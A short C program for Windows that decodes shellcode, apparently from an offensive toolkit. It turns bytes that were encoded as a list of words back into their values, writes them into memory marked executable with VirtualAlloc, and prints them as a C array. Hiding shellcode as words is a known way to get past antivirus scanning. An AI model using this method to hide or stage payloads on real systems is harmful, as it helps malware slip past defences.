#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

void decode_words(const char *words[], const char *encoded[], size_t shellcode_len, unsigned char *decoded_shellcode)
{
    for (size_t i = 0; i < shellcode_len; i++)
    {
        for (int j = 0; j <= 255; j++)
        {
            if (strcmp(words[j], encoded[i]) == 0)
            {
                decoded_shellcode[i] = (unsigned char)j;
                break;
            }
        }
    }
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_words(selected_words, encoded, shellcode_len, (unsigned char *)shellcode);

    printf("\nunsigned char shellcode[] = {");
    for (size_t i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }
    printf("\n};\n");

    return 0;
}
